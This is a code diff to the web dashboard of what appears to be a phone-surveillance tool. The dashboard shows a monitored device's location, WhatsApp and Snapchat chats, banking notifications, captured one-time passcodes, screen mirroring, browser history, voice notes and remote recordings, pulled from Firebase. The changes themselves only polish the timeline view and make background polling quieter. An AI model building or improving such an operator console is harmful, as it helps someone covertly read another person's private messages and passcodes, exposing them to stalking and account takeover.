@@ -180,14 +180,29 @@ td{padding:6px 4px;border-bottom:1px solid var(--border)}
 .tl-row{display:flex;gap:10px;align-items:flex-start}
 .tl-av{width:32px;height:32px;border-radius:50%;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:14px;color:#fff;background:#666}
 .tl-body{min-width:0;flex:1}
-.tl-name{font-weight:600;font-size:13px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.tl-msg{font-size:13px;word-break:break-word;margin-top:2px}
+.tl-name{font-weight:600;font-size:15px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.tl-msg{font-size:15px;line-height:1.45;word-break:break-word;margin-top:2px}
 .tl-meta{font-size:11px;color:var(--muted);margin-top:3px;display:flex;gap:8px;flex-wrap:wrap;align-items:center}
 .tl-fold{background:var(--accent);color:#000;border-radius:999px;padding:0 8px;font-size:11px;font-weight:700}
 .tl-otp{background:rgba(255,202,40,.16);border:1px solid var(--accent);border-radius:6px;padding:1px 8px;font-weight:700;letter-spacing:1px;cursor:pointer}
 .tl-missed{color:var(--danger);font-weight:700}
 .tl-in{color:var(--success)}
 .tl-out{color:var(--info)}
+.tl-syncslim{display:flex;align-items:center;gap:14px;flex-wrap:wrap;padding:4px 2px;font-size:11px;color:var(--muted)}
+.tl-syncmini{display:flex;align-items:center;gap:5px;cursor:pointer;user-select:none;white-space:nowrap}
+.tl-syncmini .sw{position:relative;width:30px;height:17px;flex-shrink:0}
+.tl-syncmini .sw input{opacity:0;width:0;height:0}
+.tl-syncmini .tr{position:absolute;inset:0;border-radius:9px;transition:.2s;background:var(--success)}
+.tl-syncmini .kb{position:absolute;left:2px;top:2px;width:13px;height:13px;background:#fff;border-radius:50%;transition:.2s}
+.tl-tools{display:flex;gap:6px;align-items:center;flex-wrap:nowrap}
+.tl-tools select{background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 6px;border-radius:var(--radius);font-size:13px;max-width:150px}
+.tl-tools input[type=text]{flex:1;min-width:90px;padding:6px 8px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:14px}
+.tl-more{position:relative;flex-shrink:0}
+.tl-more summary{list-style:none;cursor:pointer;font-size:16px;padding:4px 10px;border:1px solid var(--border);border-radius:var(--radius);background:var(--bg);color:var(--text);user-select:none}
+.tl-more summary::-webkit-details-marker{display:none}
+.tl-more .tl-pop{position:absolute;right:0;top:calc(100% + 6px);z-index:20;background:var(--card);border:1px solid var(--border);border-radius:10px;padding:10px 12px;display:flex;flex-direction:column;gap:8px;min-width:190px;box-shadow:0 8px 24px rgba(0,0,0,.5);font-size:13px;color:var(--muted)}
+.tl-more .tl-pop label{display:flex;align-items:center;gap:6px;cursor:pointer;white-space:nowrap}
+#tlUpdatedNote{font-size:11px;color:var(--success);white-space:nowrap;display:none}
 .grouptag{display:inline-block;margin-left:6px;padding:0 6px;border:1px solid var(--accent);color:var(--accent);border-radius:8px;font-size:12px;background:rgba(212,175,55,.12)}
 .app-daily{display:flex;gap:8px;align-items:flex-end;margin-bottom:12px;overflow-x:auto;padding-bottom:4px}
 .app-daily-bar{display:flex;flex-direction:column;align-items:center;min-width:40px;gap:2px}
@@ -305,7 +320,7 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 .snap-window{border:1px solid var(--border);border-radius:14px;overflow:hidden;background:#fff;max-width:520px;margin:0 auto;box-shadow:0 4px 20px rgba(0,0,0,.15)}
 .snap-header{background:#FFFC00;color:#000;padding:10px 14px;display:flex;align-items:center;gap:10px;font-weight:700;font-size:15px;border-bottom:1px solid #e8d400}
 .snap-chat-bg{background:#fff;padding:14px 10px;display:flex;flex-direction:column;gap:6px;min-height:260px;max-height:62vh;overflow-y:auto;scroll-behavior:smooth}
-.snap-bubble{max-width:74%;padding:8px 11px;border-radius:18px;font-size:14px;line-height:1.35;word-break:break-word;white-space:pre-wrap;position:relative;box-shadow:0 1px 2px rgba(0,0,0,.08)}
+.snap-bubble{max-width:74%;padding:8px 11px;border-radius:18px;font-size:16px;line-height:1.4;word-break:break-word;white-space:pre-wrap;position:relative;box-shadow:0 1px 2px rgba(0,0,0,.08)}
 .snap-bubble.in{background:#F0F0F0;color:#000;align-self:flex-start;border-bottom-left-radius:4px;border:1px solid #E8E8E8}
 .snap-bubble.out{background:#FFFC00;color:#000;align-self:flex-end;border-bottom-right-radius:4px;border:1px solid #e8d400}
 .snap-time{font-size:10px;color:#6a737d;margin-left:6px;vertical-align:bottom;white-space:nowrap}
@@ -328,7 +343,7 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 .priority-window{border:1px solid var(--border);border-radius:14px;overflow:hidden;background:#efeae2;max-width:520px;margin:0 auto;box-shadow:0 4px 20px rgba(0,0,0,.12)}
 .priority-header{background:#075E54;color:#fff;padding:0 10px 0 12px;display:flex;align-items:center;gap:10px;height:59px;border-bottom:1px solid #054a41;flex-shrink:0}
 .priority-chat-bg{background-color:#efeae2;background-size:430px 430px;padding:12px 10px 14px;display:flex;flex-direction:column;gap:2px;min-height:340px;max-height:62vh;overflow-y:auto;scroll-behavior:smooth}
-.priority-bubble{max-width:74%;padding:6px 7px 6px 8px;border-radius:7.5px;font-size:14.2px;line-height:1.32;box-shadow:0 1px .5px rgba(0,0,0,.13);white-space:pre-wrap;word-break:break-word;position:relative}
+.priority-bubble{max-width:74%;padding:6px 7px 6px 8px;border-radius:7.5px;font-size:16px;line-height:1.4;box-shadow:0 1px .5px rgba(0,0,0,.13);white-space:pre-wrap;word-break:break-word;position:relative}
 .priority-bubble.in{background:#fff;color:#111b21;align-self:flex-start;border-top-left-radius:0;border:1px solid #e6e6e6;margin-right:auto}
 .priority-bubble.out{background:#dcf8c6;color:#111b21;align-self:flex-end;border-top-right-radius:0;margin-left:auto}
 .priority-daysep{text-align:center;font-size:11.5px;color:#54656f;margin:12px auto 8px;letter-spacing:.2px;background:#fff;align-self:center;padding:5px 12px;border-radius:7.5px;box-shadow:0 1px 1px rgba(0,0,0,.1);text-transform:uppercase}
@@ -834,55 +849,49 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <div id="videoLoadMoreContainer"></div>
 </div>
 <div id="tab-timeline">
-<div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_timeline">
-<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
-<div style="position:relative;width:44px;height:24px">
+<div class="tl-syncslim" style="display:flex;align-items:center;gap:16px;flex-wrap:wrap;margin-bottom:6px;padding:5px 10px;background:var(--card);border:1px solid var(--border);border-radius:8px;font-size:11px;color:var(--muted)">
+<label style="display:flex;align-items:center;gap:6px;cursor:pointer;user-select:none" title="Timeline collection on/off">
+<div style="position:relative;width:44px;height:24px;flex-shrink:0">
 <input type="checkbox" id="syncPauseToggle_timeline" onchange="toggleSyncPause('timeline', this.checked)" style="opacity:0;width:0;height:0">
 <span id="syncToggleSlider_timeline" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
 <span id="syncToggleKnob_timeline" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
 </div>
-<span id="syncToggleLabel_timeline" style="font-size:13px;font-weight:600;color:var(--success)">Timeline Sync: Collecting</span>
+<span id="syncToggleLabel_timeline" style="font-weight:600">Timeline</span><span id="syncToggleStatus_timeline">—</span>
 </label>
-<span id="syncToggleStatus_timeline" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
-</div>
-<div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_browser">
-<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
-<div style="position:relative;width:44px;height:24px">
+<label style="display:flex;align-items:center;gap:6px;cursor:pointer;user-select:none" title="Browser collection on/off">
+<div style="position:relative;width:44px;height:24px;flex-shrink:0">
 <input type="checkbox" id="syncPauseToggle_browser" onchange="toggleSyncPause('browser', this.checked)" style="opacity:0;width:0;height:0">
 <span id="syncToggleSlider_browser" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
 <span id="syncToggleKnob_browser" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
 </div>
-<span id="syncToggleLabel_browser" style="font-size:13px;font-weight:600;color:var(--success)">Browser Sync: Collecting</span>
+<span id="syncToggleLabel_browser" style="font-weight:600">Browser</span><span id="syncToggleStatus_browser">—</span>
 </label>
-<span id="syncToggleStatus_browser" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
-</div>
-<div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_ai">
-<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
-<div style="position:relative;width:44px;height:24px">
+<label style="display:flex;align-items:center;gap:6px;cursor:pointer;user-select:none" title="AI collection on/off">
+<div style="position:relative;width:44px;height:24px;flex-shrink:0">
 <input type="checkbox" id="syncPauseToggle_ai" onchange="toggleSyncPause('ai', this.checked)" style="opacity:0;width:0;height:0">
 <span id="syncToggleSlider_ai" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
 <span id="syncToggleKnob_ai" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
 </div>
-<span id="syncToggleLabel_ai" style="font-size:13px;font-weight:600;color:var(--success)">AI Sync: Collecting</span>
+<span id="syncToggleLabel_ai" style="font-weight:600">AI</span><span id="syncToggleStatus_ai">—</span>
 </label>
-<span id="syncToggleStatus_ai" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+<span id="tlUpdatedNote">Updated</span>
 </div>
-<div class="tl-sticky"><div class="filter-chips" id="timelineChips">
-<span class="chip active" data-filter="all" data-label="All"><span class="chip-label">All</span> <button class="chip-del" onclick="event.stopPropagation(); deleteEntireChip('all')" title="Delete entire All chip">🗑</button></span>
-<span class="chip" data-filter="location" data-label="&#x1F4CD; Location"><span class="chip-label">&#x1F4CD; Location</span> <button class="chip-del" onclick="event.stopPropagation(); deleteEntireChip('location')" title="Delete entire Location chip">🗑</button></span>
-<span class="chip" data-filter="whatsapp_individual" data-label="&#x1F4AC; Individual"><span class="chip-label">&#x1F4AC; Individual</span> <button class="chip-del" onclick="event.stopPropagation(); deleteEntireChip('whatsapp_individual')" title="Delete entire Individual chip">🗑</button></span>
- <span class="chip" data-filter="whatsapp_group" data-label="&#x1F465; Groups"><span class="chip-label">&#x1F465; Groups</span> <button class="chip-del" onclick="event.stopPropagation(); deleteEntireChip('whatsapp_group')" title="Delete entire Groups chip">🗑</button></span>
-<span class="chip" data-filter="snapchat" data-label="&#x1F4F8; Snapchat"><span class="chip-label">&#x1F4F8; Snapchat</span> <button class="chip-del" onclick="event.stopPropagation(); deleteEntireChip('snapchat')" title="Delete entire Snapchat chip">🗑</button></span>
-<span class="chip" data-filter="banking" data-label="&#x1F4B3; Banking"><span class="chip-label">&#x1F4B3; Banking</span> <button class="chip-del" onclick="event.stopPropagation(); deleteEntireChip('banking')" title="Delete entire Banking chip">🗑</button></span>
-<span class="chip" data-filter="mirroring" data-label="&#x1F5A5; Mirroring"><span class="chip-label">&#x1F5A5; Mirroring</span> <button class="chip-del" onclick="event.stopPropagation(); deleteEntireChip('mirroring')" title="Delete entire Mirroring chip">🗑</button></span>
-<span class="chip" data-filter="security" data-label="&#x1F6E1; Security"><span class="chip-label">&#x1F6E1; Security</span> <button class="chip-del" onclick="event.stopPropagation(); deleteEntireChip('security')" title="Delete entire Security chip">🗑</button></span>
-<span class="chip" data-filter="general" data-label="&#x1F514; General"><span class="chip-label">&#x1F514; General</span> <button class="chip-del" onclick="event.stopPropagation(); deleteEntireChip('general')" title="Delete entire General chip">🗑</button></span>
-<span class="chip" data-filter="browser" data-label="&#x1F310; Browser"><span class="chip-label">&#x1F310; Browser</span> <button class="chip-del" onclick="event.stopPropagation(); deleteEntireChip('browser')" title="Delete entire Browser chip">🗑</button></span>
-<span class="chip" data-filter="ai" data-label="&#x1F916; AI Chats"><span class="chip-label">&#x1F916; AI Chats</span> <button class="chip-del" onclick="event.stopPropagation(); deleteEntireChip('ai')" title="Delete entire AI chip">🗑</button></span>
-<span class="chip" data-filter="feedback" data-label="&#x2B50; Feedback"><span class="chip-label">&#x2B50; Feedback</span> <button class="chip-del" onclick="event.stopPropagation(); deleteEntireChip('feedback')" title="Delete entire Feedback chip">🗑</button></span>
-</div>
-<div style="display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap">
-<select id="timelinePeriod" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 8px;border-radius:var(--radius);font-size:13px">
+<div class="tl-sticky"><div class="tl-tools">
+<select id="timelineFilterSel" title="Pick what to show">
+<option value="all" data-label="All">All</option>
+<option value="location" data-label="📍 Location">📍 Location</option>
+<option value="whatsapp_individual" data-label="💬 Individual">💬 Individual</option>
+<option value="whatsapp_group" data-label="👥 Groups">👥 Groups</option>
+<option value="snapchat" data-label="📸 Snapchat">📸 Snapchat</option>
+<option value="banking" data-label="💳 Banking">💳 Banking</option>
+<option value="mirroring" data-label="🖥 Mirroring">🖥 Mirroring</option>
+<option value="security" data-label="🛡 Security">🛡 Security</option>
+<option value="general" data-label="🔔 General">🔔 General</option>
+<option value="browser" data-label="🌐 Browser">🌐 Browser</option>
+<option value="ai" data-label="🤖 AI Chats">🤖 AI Chats</option>
+<option value="feedback" data-label="⭐ Feedback">⭐ Feedback</option>
+</select>
+<select id="timelinePeriod" title="Time range" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 6px;border-radius:var(--radius);font-size:13px;max-width:130px">
 <option value="all">All Time</option>
 <option value="1h">Last 1 Hour</option>
 <option value="6h">Last 6 Hours</option>
@@ -891,16 +900,14 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <option value="7d">Last 7 Days</option>
 <option value="30d">Last 30 Days</option>
 </select>
-<label style="display:flex;align-items:center;gap:4px;font-size:13px;color:var(--muted);cursor:pointer">
-<input type="checkbox" id="dedupToggle" checked> Fold repeats
-</label>
-<label style="display:flex;align-items:center;gap:4px;font-size:13px;color:var(--muted);cursor:pointer">
-<input type="checkbox" id="showSystemToggle"> Show system
-</label>
-<button class="chip" style="background:var(--accent);color:#000;border-color:var(--accent);font-size:13px" onclick="waOpenWizard()">&#x1F50D; Review Chats</button>
-<button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:13px" onclick="clearTimeline()">&#x1F5D1; Clear Timeline</button>
+<input type="text" id="timelineSearch" placeholder="🔍 Search..." title="Search contacts, numbers, messages">
+<details class="tl-more" title="More tools"><summary>•••</summary><div class="tl-pop">
+<label><input type="checkbox" id="dedupToggle" checked> Fold repeats</label>
+<label><input type="checkbox" id="showSystemToggle"> Show system</label>
+<button class="chip" style="background:var(--accent);color:#000;border-color:var(--accent);font-size:13px;justify-content:center" onclick="waOpenWizard()">🔍 Review Chats</button>
+<button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:13px;justify-content:center" onclick="clearTimeline()">🗑 Clear Timeline</button>
+</div></details>
 </div>
-<input type="text" id="timelineSearch" placeholder="&#x1F50D; Search contacts, numbers, messages..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:14px;margin-bottom:0">
 </div>
 <div id="timelineList"></div>
 </div>
@@ -3398,6 +3405,7 @@ document.getElementById('deviceSelect').addEventListener('change', function() {
   playbackPoints = [];
   clearRouteCache();
   timelineCache = null;
+  histSig = '';
   appsCache = null;
   appsFullCache = null;
   appsLastSync = 0;
@@ -3448,7 +3456,7 @@ function startPolling() {
   schedulePoll('meta', intervals.meta, pollMeta);
   schedulePoll('apps', intervals.apps, () => refreshAppsTab(false));
   schedulePoll('appSnapshots', intervals.appSnapshots, pollAppSnapshots);
-  schedulePoll('hist', intervals.hist, pollHistory);
+  schedulePoll('hist', intervals.hist, () => pollHistory(true));
   schedulePoll('voice', intervals.voice, pollVoiceNotes);
   schedulePoll('remote', intervals.remote, pollRemoteRecordings);
   schedulePoll('contacts', intervals.contacts, pollContacts);
@@ -4999,12 +5007,74 @@ function normalizeHourly(h) {
   return Object.keys(out).length ? out : null;
 }
 
-async function pollHistory() {
+let histPolling = false;
+let histSig = '';
+function tlUiSnapshot() {
+  const snap = { scroll: 0, chatScroll: 0, closedDays: [] };
+  try {
+    const sc = document.getElementById('tabContent');
+    if (sc) snap.scroll = sc.scrollTop;
+    const pane = document.querySelector('#timelineList .snap-chat-bg') || document.querySelector('#timelineList .priority-chat-bg');
+    if (pane) snap.chatScroll = pane.scrollTop;
+    document.querySelectorAll('#timelineList .tl-group').forEach(g => {
+      const body = g.querySelector('.tl-entries');
+      if (body && body.style.display === 'none') {
+        const dayEl = g.querySelector('.tl-day');
+        const nm = dayEl && dayEl.childNodes.length ? (dayEl.childNodes[0].textContent || '') : '';
+        if (nm) snap.closedDays.push(nm);
+      }
+    });
+  } catch (e) {}
+  return snap;
+}
+function tlUiRestore(snap) {
+  try {
+    if (!snap) return;
+    if (snap.closedDays && snap.closedDays.length) {
+      document.querySelectorAll('#timelineList .tl-group').forEach(g => {
+        const dayEl = g.querySelector('.tl-day');
+        const nm = dayEl && dayEl.childNodes.length ? (dayEl.childNodes[0].textContent || '') : '';
+        if (nm && snap.closedDays.indexOf(nm) !== -1) {
+          const body = g.querySelector('.tl-entries');
+          const sum = g.querySelector('.tl-summary');
+          if (body) body.style.display = 'none';
+          if (sum) sum.style.display = 'none';
+        }
+      });
+    }
+    const sc = document.getElementById('tabContent');
+    if (sc && snap.scroll) sc.scrollTop = snap.scroll;
+    const pane = document.querySelector('#timelineList .snap-chat-bg') || document.querySelector('#timelineList .priority-chat-bg');
+    if (pane && snap.chatScroll) pane.scrollTop = snap.chatScroll;
+  } catch (e) {}
+}
+let tlNoteTimer = null;
+function tlFlashNote(msg) {
+  try {
+    const n = document.getElementById('tlUpdatedNote');
+    if (!n) return;
+    n.textContent = msg;
+    n.style.display = 'inline';
+    if (tlNoteTimer) clearTimeout(tlNoteTimer);
+    tlNoteTimer = setTimeout(() => { n.style.display = 'none'; }, 4000);
+  } catch (e) {}
+}
+async function pollHistory(silent) {
   if (!selectedDevice) return;
+  if (histPolling) return;
+  histPolling = true;
   const listEl = document.getElementById('timelineList');
   const callsEl = document.getElementById('callsBody');
-  if (listEl) listEl.innerHTML = '<div class="label">\u{1F4E1} Loading timeline...</div>';
-  if (callsEl) callsEl.innerHTML = '<tr><td colspan="4" style="color:var(--muted)">Loading...</td></tr>';
+  const firstLoad = !timelineCache;
+  // Quiet background check: never rub out the screen you are reading.
+  // Only a first open or phone switch shows the Loading line.
+  if (!silent || firstLoad) {
+    if (listEl) listEl.innerHTML = '<div class="label">📡 Loading timeline...</div>';
+    if (callsEl) callsEl.innerHTML = '<tr><td colspan="4" style="color:var(--muted)">Loading...</td></tr>';
+  }
+  const uiSnap = (!silent || firstLoad) ? null : tlUiSnapshot();
+  const oldLen = timelineCache ? timelineCache.length : 0;
+  const oldNewest = timelineCache && timelineCache.length ? (parseInt(timelineCache[0].ts_ms || '0') || 0) : 0;
   try {
     // Fetch ALL timeline entries by paging backward in chunks of 1000
     // (limitToLast + endAt on the oldest key so far, dedup on the boundary).
@@ -5025,7 +5095,10 @@ async function pollHistory() {
       oldestKey = newOldest;
     }
     if (!Object.keys(all).length) {
+      histPolling = false;
+      if (silent && !firstLoad) return;
       timelineCache = null;
+      histSig = '';
       if (listEl) listEl.innerHTML = '<div class="label">No entries</div>';
       if (callsEl) callsEl.innerHTML = '<tr><td colspan="4" style="color:var(--muted)">No calls</td></tr>';
       return;
@@ -5055,10 +5128,24 @@ async function pollHistory() {
         timelineCache.sort((a,b)=>(parseInt(b.ts_ms)||0)-(parseInt(a.ts_ms)||0));
       }
     }catch{}
+    // Quiet check: if nothing changed, leave the reading screen untouched.
+    const newest = timelineCache.length ? (parseInt(timelineCache[0].ts_ms || '0') || 0) : 0;
+    const oldest = timelineCache.length ? (parseInt(timelineCache[timelineCache.length-1].ts_ms || '0') || 0) : 0;
+    const sig = timelineCache.length + '|' + newest + '|' + oldest;
+    if (silent && !firstLoad && sig === histSig) { histPolling = false; return; }
+    histSig = sig;
     renderTimeline(timelineCache);
     renderCalls(timelineCache);
+    tlUiRestore(uiSnap);
+    if (silent && !firstLoad) {
+      const added = timelineCache.length - oldLen;
+      tlFlashNote(newest > oldNewest && added > 0 ? ('Updated • ' + added + ' new') : 'Updated');
+    }
+    histPolling = false;
    } catch (e) {
     console.error('pollHistory error:', e);
+    histPolling = false;
+    if (silent && !firstLoad) { tlFlashNote('Update failed — showing saved'); return; }
     if (listEl) listEl.innerHTML = '<div class="label" style="color:var(--danger)">Timeline load error: ' + e.message + '</div>';
   }
 }
@@ -7837,10 +7924,18 @@ document.querySelectorAll('.chip[data-filter]').forEach(chip => {
     document.querySelectorAll('.chip[data-filter]').forEach(c => c.classList.remove('active'));
     chip.classList.add('active');
     timelineFilter = chip.dataset.filter;
+    const sel = document.getElementById('timelineFilterSel');
+    if (sel) sel.value = timelineFilter;
     timelineOffset = 0;
     if (timelineCache) renderTimeline(timelineCache);
     else pollHistory();
   });
+});
+document.getElementById('timelineFilterSel')?.addEventListener('change', function() {
+  timelineFilter = this.value;
+  timelineOffset = 0;
+  if (timelineCache) renderTimeline(timelineCache);
+  else pollHistory();
 });
 
 // ── Snapchat & AI thread renderers — readable chat like real app ──
@@ -8044,6 +8139,17 @@ function renderTimeline(docs) {
     const txt = chip.dataset.label + (counts[f] !== undefined ? ' (' + counts[f] + ')' : '');
     if(lbl) lbl.textContent = txt; else chip.textContent = txt;
   });
+  // Keep the small pick box in sync, with counts
+  try {
+    const sel = document.getElementById('timelineFilterSel');
+    if (sel) {
+      for (const opt of sel.options) {
+        const base = opt.dataset.label || opt.textContent;
+        opt.textContent = base + (counts[opt.value] !== undefined ? ' (' + counts[opt.value] + ')' : '');
+      }
+      if (sel.value !== timelineFilter) sel.value = timelineFilter;
+    }
+  } catch (e) {}
   // Search filter — looks in names, groups, links, titles and full text too
   const tlSearch = (document.getElementById('timelineSearch')?.value || '').toLowerCase().trim();
   if (tlSearch) docs = docs.filter(d => {
@@ -8514,7 +8620,7 @@ document.getElementById('showSystemToggle')?.addEventListener('change', function
 async function clearTimeline() {
   if (!selectedDevice || !confirm('Delete ALL timeline entries from Firebase RTDB?\nThis cannot be undone.')) return;
   const ok = await deleteRTDB(`devices/${selectedDevice}/timeline`);
-  if (ok) { timelineCache = null; document.getElementById('timelineList').innerHTML = '<div class="label">No entries</div>'; showAlert('Timeline deleted', 'warn'); }
+  if (ok) { timelineCache = null; histSig = ''; document.getElementById('timelineList').innerHTML = '<div class="label">No entries</div>'; showAlert('Timeline deleted', 'warn'); }
   else showAlert('Failed to delete timeline', 'error');
 }
 // --- Timeline search ---
